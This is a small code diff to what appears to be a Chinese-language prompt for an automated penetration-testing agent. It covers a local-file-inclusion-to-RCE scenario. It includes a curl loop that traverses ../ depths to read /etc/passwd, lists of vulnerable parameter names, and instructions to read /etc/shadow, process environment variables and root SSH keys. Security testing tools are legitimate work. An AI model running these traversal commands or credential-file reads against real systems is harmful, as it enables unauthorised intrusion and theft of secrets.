@@ -417,7 +417,7 @@ REACT_FREEFORM_EXPLORE = """【自由探索阶段】
 
 场景6: 文件包含（LFI → RCE 链式攻击）
   【关键】必须遍历 1-10 级 ../ 深度，不同应用安装目录不同:
-  for d in 1 2 3 4 5 6 7 8 9 10; do TRAV=$(printf '../%.0s' $(seq 1 $d)); curl -s "http://TARGET:PORT/page?file=${TRAV}etc/passwd"; done
+  for d in 1 2 3 4 5 6 7 8 9 10; do TRAV=$(printf '../%.0s' $(seq 1 $d)); curl -s "http://TARGET:PORT/page?file=${{TRAV}}etc/passwd"; done
   常见参数: page, file, include, path, image, content, template, view, doc, folder
   确认LFI后，必须按顺序逐步深入（不要跳过！）:
   1) 用已确认的深度+参数读取高价值文件: /etc/shadow, /proc/self/environ, /root/.ssh/id_rsa
